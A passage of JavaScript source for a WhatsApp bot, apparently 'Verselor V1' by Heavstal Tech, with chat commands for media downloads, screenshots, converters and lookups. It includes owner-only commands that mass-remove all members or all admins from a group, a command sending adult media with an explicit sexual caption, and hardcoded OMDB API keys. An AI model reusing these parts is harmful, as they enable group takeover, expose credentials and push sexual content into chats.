        const res = await response.json();
        if (res.status === 'success' && res.data && res.data.link) { 
            await HeavstalTech.sendMessage(m.chat, {
                image: { url: res.data.link },
                caption: `*📸 Website Screenshot*\n\n` +
                         `🔗 *Target:* ${res.data.url}\n` +
                         `📱 *Device:* ${res.data.device}\n` +
                         `⚡ *Provider:* ${res.data.provider || 'Heavstal API'}`
            }, { quoted: m });
        } else {
            await Vreply(`*Screenshot Failed*\n\n${res.error || 'The URL may be invalid or the site refused connection.'}`);
        }
    } catch (e) {
        console.error("Screenshot Error:", e);
        Vreply(`*Error:* An unexpected error occurred while connecting to Heavstal Tech.`);
    }
}
break;
//=================================================//


//=================================================//
case 'markdown':
case 'mdtohtml':
case 'md': {
    if (!text) return Vreply(`*Please Provide Markdown Text*\n\nExample: ${prefix + command} # Title\n**Bold** text`)
    Vreply(mess.wait)
await loading()
    try {
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/markdown', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ markdown: text })
        })
        const res = await response.json()

        if (res.status === 'success' && res.data && res.data.html) {
            const htmlOutput = res.data.html
            await Vreply(`*📝 Markdown to HTML*\n\n\`\`\`html\n${htmlOutput}\n\`\`\``)
        } else {
            await Vreply(`*Conversion Failed*\n\n${res.error || 'Could not convert markdown.'}`)
        }
    } catch (e) {
        console.error("Markdown Command Error:", e)
        Vreply(`*Error:* An unexpected error occurred.`)
    }
}
break;
//=================================================//


//=================================================//
case 'morse': {
    if (!text.includes('|')) {
        return Vreply(`*Invalid Format*\n\nPlease use the separator *"|"*\nExample: ${prefix + command} encode | Hello World\nExample: ${prefix + command} decode | ... --- ...`)
    }
    let [mode, content] = text.split('|')
    mode = mode.trim().toLowerCase()
    content = content ? content.trim() : ''
    if (!['encode', 'decode'].includes(mode)) {
        return Vreply(`*Invalid Mode*\n\nPlease use 'encode' or 'decode'.`)
    }
    if (!content) {
        return Vreply(`*Please provide text to ${mode}*`)
    }
    Vreply(mess.wait)
await loading()
    try {
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/morse', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ 
                text: content,
                mode: mode
            })
        })
        const res = await response.json()
        if (res.status === 'success' && res.data) {
            const { input, output } = res.data
            const resultText = `*📟 Morse Code Converter*\n\n` +
                               `📥 *Input:* ${input}\n` +
                               `📤 *Output:* \`\`\`${output}\`\`\`\n\n` +
                               `${footer}`
            await Vreply(resultText)
        } else {
            await Vreply(`*Conversion Failed*\n\n${res.error || 'Could not process the request.'}`)
        }
    } catch (e) {
        console.error("Morse Command Error:", e)
        Vreply(`*Error:* An unexpected error occurred.`)
    }
}
break;
//=================================================//


//=================================================//
case 'twitter':
case 'twitterdl':
case 'x':
case 'xdl': {
    if (!text) return Vreply(`*Please Provide a Twitter/X Link*\n\nExample: ${prefix + command} https://x.com/user/status/123456...`);
    if (!text.match(/(twitter\.com|x\.com)/gi)) {
        return Vreply("Please provide a valid Twitter or X URL.");
    }
    Vreply(mess.wait)
await loading();
    try {
        const apiKey = HT_API_KEY;
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/twitter', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ url: text.trim() })
        });
        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { description, video_hd, video_sd, thumbnail } = res.data;
            const mediaUrl = video_hd || video_sd;
            if (!mediaUrl) {
                if (thumbnail) {
                    await HeavstalTech.sendMessage(m.chat, {
                        image: { url: thumbnail },
                        caption: `*🐦 X / Twitter Image*\n\n📝 *Desc:* ${description || 'No description'}\n\n${footer}`
                    }, { quoted: m });
                    return;
                }
                return await Vreply(`*Download Failed*\n\nNo downloadable media found in this tweet.`);
            }

            const caption = `*🐦 X / Twitter Downloader*\n\n` +
                            `📝 *Desc:* ${description || 'No description'}\n\n` +
                            `${footer}`;

            await HeavstalTech.sendMessage(m.chat, {
                video: { url: mediaUrl },
                caption: caption
            }, { quoted: m });
        } else {
            await Vreply(`*Request Failed*\n\nCould not fetch tweet. Make sure the link is correct and the account is public.`);
        }
    } catch (e) {
        console.error("Twitter Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred while connecting to Heavstal Tech.`);
    }
}
break;
//=================================================//


//=================================================//
case 'ttmp3':
case 'tiktokmp3':
case 'ttmp3':
case 'ttaudio': {
    if (!text) return Vreply(`*Please Provide a TikTok Link or Query*\n\nExample: ${prefix + command} https://vm.tiktok.com/xxxx`)
    Vreply(mess.wait)
await loading()
    try {
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/tiktok', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ query: text.trim() })
        })
        const res = await response.json()
        if (res.status === 'success' && res.data && res.data.audio) {
            const { title, author, audio, cover } = res.data
            await HeavstalTech.sendMessage(m.chat, {
                audio: { url: audio },
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`,
                contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: `Audio by ${author}`,
                        thumbnailUrl: cover || "https://files.catbox.moe/g8pxls.png",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        sourceUrl: audio
                    }
                }
            }, { quoted: m })
        } else {
            await Vreply(`*Request Failed*\n\nCould not fetch audio. Please check the link.`)
        }
    } catch (e) {
        console.error("TikTok MP3 Error:", e)
        Vreply(`*Error:* An unexpected error occurred.`)
    }
}
break;
//=================================================//


//=================================================//
case 'instagram': 
case 'ig': {
  if (!text) return Vreply(example(`input ig link`))
  if (!(text.includes('instagram.com') || text.includes('instagr.am') || text.includes('igtv'))) {
    return Vreply('Input a valid Instagram link!')
  }
  try {
    const result = await igdl(text)
    if (!result || result.length === 0) {
      return Vreply('Failed to get video. Make sure the URL entered is correct.')
    }
    for (let video of result) {
      await HeavstalTech.sendFile(m.chat, video.url, 'instagram.mp4', '𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶.', m)
    }
  } catch (err) {
    console.error(err)
    Vreply('An error occurred while trying to download the video.')
  }
} 
break;
//=================================================//


//=================================================//
case "facebook": 
case "fb": 
case "fbdl": 
case "fbvideo": {
    if (!text) return Vreply(example("facebook media link"));
    if (!(text.includes('facebook.com') || text.includes('fb.watch'))) {
        return Vreply('Please provide a valid Facebook link!');
    }
    await HeavstalTech.sendMessage(m.chat, { react: { text: '🎬', key: m.key } });

    try {
        const result = await fbdl(text);
        if (!result) {
            return Vreply("Process Failed: Could not fetch video. The link might be private or the video was deleted.");
        }
        await HeavstalTech.sendMessage(m.chat, { 
            video: { url: result }, 
            caption: `*🎬 FACEBOOK DOWNLOADER*\n\n┃━ ${MenuStyle} *Status:* Success\n┃━ ${MenuStyle} *Requested By:* ${pushname}\n\n${global.CAPTION}\n${footer}` 
        }, { quoted: m });
        await HeavstalTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (error) {
        console.error("[FB DOWNLOAD ERROR]", error);
        await HeavstalTech.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        Vreply(`An error occurred while processing the Facebook video. Ensure the link is public.`);
    }
}
break;
//=================================================//


//=================================================//
case 'imdb':
case 'movieinfo': {
    if (!text) return Vreply(`Please provide a movie or series name\n*Example:* ${prefix + command} stranger things`);
    Vreply(mess.wait);
    await loading();
    try {
        const res = await fetch(`http://www.omdbapi.com/?apikey=742b2d09&t=${encodeURIComponent(text)}&plot=full`);
        const data = await res.json();
        
        if (data.Response === "False") return Vreply("Movie not found!");

        let imdbt = "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
        imdbt += "🎬Title      : " + data.Title + "\n";
        imdbt += "📅Year       : " + data.Year + "\n";
        imdbt += "⭐Rated      : " + data.Rated + "\n";
        imdbt += "📆Released   : " + data.Released + "\n";
        imdbt += "⏳Runtime    : " + data.Runtime + "\n";
        imdbt += "🌀Genre      : " + data.Genre + "\n";
        imdbt += "👨🏻‍💻Director   : " + data.Director + "\n";
        imdbt += "✍Writer     : " + data.Writer + "\n";
        imdbt += "👨Actors     : " + data.Actors + "\n";
        imdbt += "📃Plot       : " + data.Plot + "\n";
        imdbt += "🌐Language   : " + data.Language + "\n";
        imdbt += "🌍Country    : " + data.Country + "\n";
        imdbt += "🎖️Awards     : " + data.Awards + "\n";
        imdbt += "📦BoxOffice  : " + data.BoxOffice + "\n";
        imdbt += "🏙️Production : " + data.Production + "\n";
        imdbt += "🌟imdbRating : " + data.imdbRating + "\n";
        imdbt += "✅imdbVotes  : " + data.imdbVotes;

        await HeavstalTech.sendMessage(m.chat, {
            image: { url: data.Poster !== 'N/A' ? data.Poster : 'https://files.catbox.moe/g8pxls.png' },
            caption: imdbt
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        Vreply(mess.error.fitur);
    }
}
break;
//=================================================//             


//=================================================//              
case 'gdrive': {
		if (!args[0]) return Vreply(`Enter a Google Drive link`)
		Vreply(mess.wait);
	await loading();
	try {
	let res = await fg.GDriveDl(args[0])
	 await Vreply(`
≡ *Google Drive DL*
▢ *Name:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
       HeavstalTech.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch (e) {
   console.log(e);
	Vreply(`${mess.error.feature}\n_Details:_ ${e}\n\n${footer}`) 
  }
}
break;
//=================================================//


//=================================================//     
case 'support2': {
const support = `*Welcome To Heavstal Tech Support*\n\nYou Can Support Us By Engaging In Our Various Communities.

*Official Website*: https://heavstal-tech.vercel.app

*WhatsApp Channel:* https://whatsapp.com/channel/0029VbBcg80KwqSR7dr7do1D

*WhatsApp Group:* https://chat.whatsapp.com/F0gAKf6g7a18sY5WqtWxVt?mode=ems_copy_t

*Telegram Channel:* https://t.me/promisemdv1

*Telegram Group:* https://t.me/+OXpT1vvQ5K81MmVk

*YouTube Channel:* *https://www.youtube.com/@Heavstal_Tech

${footer}

`;
Vreply(support)
}
break;
//=================================================//


//=================================================//
case 'charge': {
const { performance } = require('perf_hooks'); // For measuring latency
let startTime = performance.now(); // Start time
// Construct the initial message
let initialMessage = 
 `battery 🪫 low
╔═══════════╗
║░░░░░░░░░░░╚╗
║░░░░░1%░░░░░░║
║░░░░░░░░░░░╔╝
╚═══════════╝

${footer}`;

try {
// Send the initial message and get the message ID
let sentMessage = await HeavstalTech.sendMessage(m.chat, { text: initialMessage });
let initialMessageId = sentMessage.key.id; // Use sentMessage.key.id for the message ID
// Schedule the first edit after 2 seconds
setTimeout(async () => {
try {
await HeavstalTech.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║██░░░░░░░░░╚╗
║██░░░⚡░░░░░░║
║██░░░░░░░░░╔╝
╚═══════════╝

${footer}`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('First edit successful.');
} catch (error) {
console.error('Error during first edit:', error);
}
}, 2000); // 2000 ms = 2 seconds
// Schedule the second edit after 4 seconds
setTimeout(async () => {
try {
await HeavstalTech.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║████░░░░░░░╚╗
║████░30%░░░░░║
║████░░░░░░░╔╝
╚═══════════╝

${footer}`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Second edit successful.');
} catch (error) {
console.error('Error during second edit:', error);
}
}, 4000); // 4000 ms = 4 seconds
// Schedule the third edit after 6 seconds
setTimeout(async () => {
try {
await HeavstalTech.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║██████░░░░░╚╗
║█████░50%░░░░║
║██████░░░░░╔╝
╚═══════════╝

${footer}`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Third edit successful.');
} catch (error) {
console.error('Error during third edit:', error);
}
}, 6000); // 6000 ms = 6 seconds
// Schedule the fourth edit after 8 seconds
setTimeout(async () => {
try {
await HeavstalTech.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║█████████░░╚╗
║███░75%░░█░░░║
║█████████░░╔╝
╚═══════════╝

${footer}`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fourth edit successful.');
} catch (error) {
console.error('Error during fourth edit:', error);
}
}, 8000); // 8000 ms = 8 seconds

// Schedule the fifth edit after 10 seconds
setTimeout(async () => {
try {
await HeavstalTech.sendMessage(m.chat, {
text: `🔋~_.Charged._~
╔═══════════╗
║███████████╚╗
║███░100%░████║
║███████████╔╝
╚═══════════╝

${footer}`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fifth edit successful.');
} catch (error) {
console.error('Error during fifth edit:', error);
}
}, 10000); // 10000 ms = 10 seconds
// Schedule the final message after 12 seconds
setTimeout(async () => {
try {
await HeavstalTech.sendMessage(m.chat, {
text: ` 𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶
     
　　　⢀⡤⠔⠒⠒⢌⡛⠒⢦⣄⠀⠀⠀⠀⠀
　　⡠⠚⠁　⣀⡠⠒⠚⡄⠑　⠈⠳⡄⠀⠀⠀
　⢀⡞⠁⠠⠦　　　⠸⠠⠀　⢀⠤⠜⣆⠀⠀
⢀⡎　　⠡⡀　⠐⠂　⠈　　⣁⠀⣀⣸⡆⠀
⢸⠀⡤⡀　⡧　　　⠠⠤　⠨　　　⢧⠀
⠀⢧　⠈⢀⠆⣤⣤⣶⣶⣦⣤⠁⢀⠔⣢⣴⣶⢨⠇
　⠘⡆⡄　 ⣿⣿⣿⣿⣿⣿⡆　⣼⣿⣿⣿⡏⠀
　　⢻⠀⠇　⠙⢿⣿⣿⡿⢿⠁ ⠻⠿⠿⢿⡅⠀
⠀⠀⢈⡷⢼⠈⢈⣀⠠　⠐⠊⢀⣾⡟⣦⠤⠼⠁⠀
　　⠘⣆⠅⣽⠉⠘⡆⠆　⢀⠛⠓⡁⢻⠀⠀⠀⠀
　　　⢺⠐⠙⢦⢀⡧⣈⣘⣈⣀⣢⣣⣾
　　　⠈⠳⢌⠈⠛⢷⣓⡜⢤⠧⡗⣿⡇⠀⠀⠀⠀
　　　　　⠳⣄⠀⠀⠉⠍⠉⡀⡞⠀⠀⠀⠀⠀
　　　　　　⠉⠑⠲⠤⠴⠚⠁⠀⠀⠀⠀⠀⠀⠀ 
> 𝙁𝙪𝙡𝙡𝙮 𝘾𝙝𝙖𝙧𝙜𝙚𝙙, 𝙄𝙩 𝙬𝙖𝙨 𝙬𝙤𝙧𝙩𝙝 𝙞𝙩 𝙧𝙞𝙜𝙝𝙩? 
> 𝐂𝐫𝐞𝐝𝐢𝐭:- 𝐇𝐄𝐀𝐕𝐒𝐓𝐀𝐋 𝐓𝐄𝐂𝐇`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Final edit successful.');
} catch (error) {
console.error('Error during final edit:', error);
}
}, 12000); // 12000 ms = 12 seconds
} catch (error) {
console.error('Error sending initial message:', error);
}
}
break;
//=================================================//


//=================================================//
case 'checksite':
case 'checkweb': 
case 'httpstatus':
case 'statuscheck': 
case 'http': {
    if (!text) return Vreply(`*Please Provide A URL to Inspect*\n\nExample: ${prefix + command} https://google.com`);
    
    let targetUrl = text.trim();
    if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
    targetUrl = "https://" + targetUrl;
    }
    Vreply(mess.wait)
await loading();

    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/http-status', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ url: targetUrl })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { url, status, code, latency, ip } = res.data;
            const statusIcon = status === 'UP' ? '🟢' : '🔴';
            const statusReport = `*📡 HTTP Status Monitor*\n\n` +
                                 `🔗 *Target:* ${url}\n` +
                                 `📊 *Status:* ${status} ${statusIcon}\n` +
                                 `🔢 *Code:* ${code}\n` +
                                 `⚡ *Latency:* ${latency}\n` +
                                 `🌐 *IP:* ${ip}`;

            await HeavstalTech.sendMessage(m.chat, {
                text: statusReport
            }, { quoted: m });
        } else {
            await Vreply(`*Check Failed*\n\nCould not inspect "${targetUrl}". The site might be down or unreachable.`);
        }
    } catch (e) {
        console.error("HTTP Status Error:", e);
        Vreply(`*Error:* An unexpected error occurred while connecting to Heavstal Tech.`);
    }
}
break;
//=================================================//


//=================================================//
case 'mediafire': 
case 'mediafiredl': {
    if (!text) return 
        Vreply(`*Provide A MediaFire Link*\n\nExample: ${prefix + command} https://www.mediafire.com/file/xxxx`);
    if (!text.includes("mediafire.com")) return Vreply("*Invalid Link!* Please provide a valid MediaFire URL.");
    Vreply(mess.wait)
await loading(); // kill it if you don't have

    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/mediafire', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ url: text.trim() })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data && res.data.link) {
            const { filename, filetype, filesize, link } = res.data;
            const caption = `*📦 MediaFire Downloader*\n\n` +
                            `📄 *Name:* ${filename}\n` +
                            `📊 *Size:* ${filesize}\n` +
                            `📂 *Type:* ${filetype}\n\n`;

            await HeavstalTech.sendMessage(m.chat, {
                document: { url: link },
                fileName: filename,
                mimetype: 'application/octet-stream',
                caption: caption
            }, { quoted: m });
        } else {
            await Vreply(`*Download Failed*\n\nUnable to fetch file details. Make sure the link is valid`);
        }
    } catch (e) {
        console.error("MediaFire Error:", e);
        Vreply(`*Error:* An unexpected error occurred while processing the download.`);
    }
}
break;
//=================================================//


//=================================================//
case 'toaud': case 'tomp3': case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return await Vreply(example(`reply to a video/audio`))
if (!quoted) return Vreply(`reply to a video or audio`)
let media = await quoted.download()
let audio = await toAudio(media, 'mp4')
await HeavstalTech.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg', caption: ''}, { quoted : m })
}
break;
//=================================================//


//=================================================//
case 'npmsearch':{
if (!text) return Vreply(example(`axios`))
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	Vreply(txt)
}
break;
//=================================================//


//=================================================//
case 'tomp4':
case 'tovideo': {
    if (!/webp/.test(mime)) return Vreply(`Reply to an animated sticker with caption *${prefix + command}*`);   
    await HeavstalTech.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    let mediaBuffer = await HeavstalTech.downloadMediaMessage(quoted);
    let videoBuffer = await webp2mp4(mediaBuffer);
    await HeavstalTech.sendMessage(m.chat, {
        video: videoBuffer,
        caption: 'Convert Webp To Video'
    }, { quoted: m });
    await HeavstalTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
//=================================================//


//=================================================//
case 'logout': {
  if (!isOwner) return Vreply(mess.owner)
  Vreply('Logging out all devices...')
  await sleep(4000)
  await HeavstalTech.logout()
  }
  break;
//=================================================//  
  

//=================================================//  
case 'listblock':
case 'listblocked': {
if (!isOwner) return Vreply(mess.owner)
let listblok = await HeavstalTech.fetchBlocklist()
if (listblok.length === 0) {
Vreply('No blocked users found.')
} else {
let blockedList = listblok.map((v, i) => `${i + 1}. @${v.replace(/@.+/, '')}`).join('\n')
await Vreply(`Blocked contact\n` +
`Total: ${listblok.length} blocked\n` +
blockedList)
}
} 
break;
//=================================================//


//=================================================//
case 'runtime': {
let runtime = `*${botname} Has Been Active And Running For:* ${runtime(process.uptime())}`
await Vreply(runtime)
}
break;
//=================================================//


//=================================================//
case 'ping':
case 'speed': {
 const startTime = Date.now();
 const pingMsg = await HeavstalTech.sendMessage(m.chat, { 
 text: `*${botname}*\n\n🕒 *Checking ping...*` 
 });
 setTimeout(async () => {
 const latency = (Date.now() - startTime) / 1000;
 const botUptime = runtime(process.uptime());
 const responseText = `
> ╭━━〔 𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑      𝐕𝟏 〕━━╮
> ┃ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗖𝗧𝗜𝗩𝗘
> ┃────────────────────
> ┃𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝗦𝗽𝗲𝗲𝗱: ${latency.toFixed(4)} _seconds_
> ┃*𝗨𝗽𝘁𝗶𝗺𝗲:* ${botUptime}
> ┃*𝗥𝗮𝗺 𝗨𝘀𝗮𝗴𝗲:* ${usedRam} / ${totalRam}
> ╰════════════════════

${footer}
 `.trim();

 await HeavstalTech.relayMessage(m.chat, {
 protocolMessage: {
 key: pingMsg.key,
 type: 14,
 editedMessage: { conversation: responseText }
 }
 }, {});
 }, 1000);
}
break;
//=================================================//


//=================================================//
case 'apk':
case 'app': 
case 'apkdl': {
    if (!text) return Vreply(`*Please provide an app name*\n\nExample: ${prefix + command} Facebook Lite`);
    Vreply(mess.wait)
await loading();
    
    try {
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/apk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ query: text.trim() })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { name, version, size, download_link, icon, package: pkg } = res.data;
            const info = `*📲 APK Downloader*\n\n` +
                         `📌 *Name:* ${name}\n` +
                         `🆔 *Package:* ${pkg}\n` +
                         `🆚 *Version:* ${version}\n` +
                         `📦 *Size:* ${size}\n\n` +
                         `_Sending file..._`;

            await HeavstalTech.sendMessage(m.chat, { image: { url: icon }, caption: info }, { quoted: m });
            await HeavstalTech.sendMessage(m.chat, {
                document: { url: download_link },
                mimetype: 'application/vnd.android.package-archive',
                fileName: `${name}_${version}.apk`
            }, { quoted: m });
        } else {
            await Vreply(`*App Not Found*`);
        }
    } catch (e) {
        console.error("APK Command Error:", e);
        Vreply(`*Error:* Fetch failed.`);
    }
}
break;
//=================================================//


//=================================================//
case 'kickadmins': {
    if (!m.isGroup) return Vreply(mess.only.group)
    if (!isCreator) return Vreply(mess.owner)
    if (m.isGroup && !isBotAdmin) return Vreply(mess.only.badmin)
    try {
    let metadata = await HeavstalTech.groupMetadata(m.chat)
    let participants = metadata.participants
    for (let member of participants) {
        if (member.id === botNumber) continue
        if (member.id === m.sender) continue
        if (member.admin === "superadmin" || member.admin === "admin") {
            await HeavstalTech.groupParticipantsUpdate(
                m.chat,
                [member.id],
                'remove'
            )
            await sleep(1000);
        }
    }
    Vreply("All admins kicked (except you and the bot)!")
} catch (e) {
    console.log(chalk.redBright(`[KICK-ADMINS CMD ERROR]: ${e}`));
       Vreply(`${mess.error.fitur}\n${e}`);
   }
}
break;
//=================================================//


//=================================================//
case 'kickall': {
    if (!isCreator) return Vreply(mess.owner)
    if (!m.isGroup) return Vreply(mess.only.group)
    if (!isCreator) return Vreply(m.admin)
    if (m.isGroup && !isBotAdmin) return Vreply(mess.only.badmin)
    try {
    let metadata = await HeavstalTech.groupMetadata(m.chat)
    let participants = metadata.participants
    for (let member of participants) {
        if (member.id === botNumber) continue
        if (member.admin === "superadmin" || member.admin === "admin") continue 
        await HeavstalTech.groupParticipantsUpdate(
            m.chat,
            [member.id],
            'remove'
        )
        await sleep(1000);
    }
    Vreply("✅ All members have been removed (except admins & bot).")
    } catch (e) {
    console.log(chalk.redBright(`[KICK-ALL CMD ERROR]: ${e}`));
       Vreply(`${mess.error.fitur}\n${e}`);
   }
}
break;
//=================================================//


//=================================================//
case 'paptt': {
if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw)
 if (!isCreator) return Vreply(m.premium)
global.paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]
 let url = paptt[Math.floor(Math.random() * paptt.length)]
 HeavstalTech.sendFile(m.chat, url, null, 'Aww..umm💦,am so horny come ride my pu**y anyhow u want🤤🍑🍆', m)
}
break;
//=================================================//


//=================================================//
case 'coffee': {
HeavstalTech.sendMessage(m.chat, {caption: m.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break;
//=================================================//            


//=================================================//            
case 'myip': {
        if (!isCreator) return Vreply(mess.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    Vreply("Your Ip Address Is: " + ip)
})
})
            }
        break;
//=================================================//

        
//=================================================//
case "movie": {
    if (!text) return Vreply(`Provide a movie title. Example: ${prefix}movie Inception`);
    try {
        const response = await fetch(`http://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60`);
        const data = await response.json();
        if (data.Response === "False") return Vreply("Movie not found.");
        const msg = `🎬 Title: ${data.Title}
Year: ${data.Year}
Rated: ${data.Rated}
Released: ${data.Released}
Runtime: ${data.Runtime}
Genre: ${data.Genre}
Director: ${data.Director}
Actors: ${data.Actors}
Plot: ${data.Plot}
IMDB Rating: ${data.imdbRating}
Link: https://www.imdb.com/title/${data.imdbID}`;
        await HeavstalTech.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error(e);
        Vreply(`${mess.error.fitur}\n${e}`);
    }
}
break;
//=================================================//


//=================================================//
case "recipe-ingredient": {
    if (!text) return Vreply(`Provide an ingredient. Example: ${prefix}recipe-ingredient chicken`);
    try {
        const response = await fetch(`https://www.themealdb.com/api/json/v1/1/filter.php?i=${encodeURIComponent(text)}`);
        const data = await response.json();
        if (!data.meals) return Vreply(" No recipes found with that ingredient.");
        const meals = data.meals.slice(0, 5).map((m, i) => `${i + 1}. ${m.strMeal}\nhttps://www.themealdb.com/meal.php?c=${m.idMeal}`).join("\n\n");
        await HeavstalTech.sendMessage(m.chat, { text: `🍴 Recipes with "${text}":\n\n${meals}` }, { quoted: m });
    } catch (e) {
        Vreply(`${mess.error.fitur}\n${e}`);
    }
}
break;
//=================================================//
        

//=================================================//
case "mathfact": {
    try {
        const response = await fetch("http://numbersapi.com/random/math?json");
        const data = await response.json();
        await HeavstalTech.sendMessage(m.chat, { text: `🔢 Math Fact:\n${data.text}` }, { quoted: m });
    } catch (e) {
        Vreply(`${mess.error.fitur}\n${e}`);
    }
}
break;
//=================================================//
        

//=================================================//
case "sciencefact":
case "science-fact": {
    try {
        const response = await fetch("https://uselessfacts.jsph.pl/random.json?language=en");
        const data = await response.json();
        await HeavstalTech.sendMessage(m.chat, { text: `🔬 Science Fact:\n${data.text}` }, { quoted: m });
    } catch (e) {
        Vreply(`${mess.error.fitur}\n${e}`);
    }
}
break;
//=================================================//


//=================================================//
case "book": {
    if (!text) return Vreply(`Provide a book title or author. Example: ${prefix}book Harry Potter`);
    try {
        const response = await fetch(`https://openlibrary.org/search.json?q=${encodeURIComponent(text)}&limit=5`);
        const data = await response.json();
        if (!data.docs?.length) return Vreply(" No books found.");
        const books = data.docs.map((b, i) => `${i + 1}. ${b.title} by ${b.author_name?.[0] || "Unknown"}\nLink: https://openlibrary.org${b.key}`).join("\n\n");
        await HeavstalTech.sendMessage(m.chat, { text: `📚 Book Search Results:\n\n${books}` }, { quoted: m });
    } catch (e) {
        Vreply(`${mess.error.fitur}\n${e}`);
    }
}
break;
//=================================================//


//=================================================//
case "horoscope": {
    if (!text) return Vreply(`Provide your zodiac sign. Example: ${prefix}horoscope leo`);
    try {
        const response = await fetch(`https://aztro.sameerkumar.website/?sign=${text.toLowerCase()}&day=today`, { method: "POST" });
        const data = await response.json();
        const msg = `🔮 Horoscope for ${text.toUpperCase()}:\nMood: ${data.mood}\nLucky Number: ${data.lucky_number}\nLucky Color: ${data.color}\nCompatibility: ${data.compatibility}\nDate Range: ${data.date_range}\n\n${data.description}`;
        await HeavstalTech.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        Vreply(`${mess.error.fitur}\n${e}`);
    }
}
break;
//=================================================//

//=================================================//
case "recipe": {
    if (!text) return Vreply(`Provide a dish name. Example: ${prefix}recipe pancakes`);
    try {
        const response = await fetch(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`);
        const data = await response.json();
        if (!data.meals) return Vreply("No recipes found.");
        const meal = data.meals[0];
